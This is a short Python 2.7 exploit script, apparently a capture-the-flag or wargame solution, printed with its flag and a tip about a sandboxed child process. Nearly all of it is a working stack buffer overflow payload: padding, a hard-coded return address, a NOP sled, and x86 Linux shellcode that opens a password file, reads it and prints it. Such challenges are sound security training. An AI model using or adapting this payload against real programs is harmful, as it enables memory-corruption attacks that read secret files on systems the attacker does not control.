#!/usr/bin/python2.7
# FLAG: wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
# TIP: Writing memory behind child (sandbox) process memory area.
# http://codegists.com/user/kyrre

shellcode = ""

SHELLCODE_BUF_SIZE = 156
SPRAY = "\x90" * 300
READ_FLAG = "\x31\xc9\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x20\xcd\x80\x31\xc0\xb0\x04\xb3\x01\x89\xe1\xcd\x80\x31\xc0\x68\x83\xca\xe3\xb7\xc3"
RET_ADDR = "\xD4\xF6\xFF\xBF"

shellcode += "A" * SHELLCODE_BUF_SIZE
shellcode += RET_ADDR
shellcode += SPRAY
shellcode += READ_FLAG

print shellcode
